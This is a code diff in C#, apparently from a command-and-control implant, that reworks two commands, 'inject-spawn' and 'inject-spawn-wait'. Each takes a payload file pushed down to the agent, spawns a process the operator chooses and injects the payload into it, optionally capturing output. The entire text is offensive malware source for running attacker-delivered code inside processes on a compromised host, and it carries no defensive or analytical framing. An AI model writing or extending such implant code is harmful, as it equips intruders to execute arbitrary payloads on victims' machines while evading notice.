@@ -12,9 +12,7 @@ namespace Agent.Commands
 {
     public class SpawnInjectCommand : AgentCommand
     {
-        public override string Name => "inject-spawn";
-
-        public virtual bool WaitProcessEnd { get; set; } = false;
+        public override string Name => "inject-spawn-wait";
 
         public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
@@ -24,7 +22,7 @@ namespace Agent.Commands
             var file = context.FileService.ConsumeDownloadedFile(task.FileId);
             var fileContent = file.GetFileContent();
 
-            var injectRes = Injector.SpawnInjectWithOutput(fileContent, task.Arguments, this.WaitProcessEnd);
+            var injectRes = Injector.SpawnInjectWithOutput(fileContent, task.Arguments);
             if (!injectRes.Succeed)
                 context.Result.Result += $"Injection failed : {injectRes.Error}";
             else
@@ -36,9 +34,22 @@ namespace Agent.Commands
         }
     }
 
-    public class SpawnWaitInjectCommand : SpawnInjectCommand
+    public class SpawnWaitInjectCommand : AgentCommand
     {
-        public override string Name => "inject-spawn-wait";
-        public override bool WaitProcessEnd => true;
+        public override string Name => "inject-spawn";
+
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        {
+
+            this.CheckFileDownloaded(task, context);
+
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var fileContent = file.GetFileContent();
+            var process = task.SplittedArgs[0];
+
+            context.Result.Result += $"Injection in {process}..." + Environment.NewLine;
+            Injector.SpawnInject(fileContent, process);
+            context.Result.Result += $"Injection succeed!" + Environment.NewLine;
+        }
     }
 }
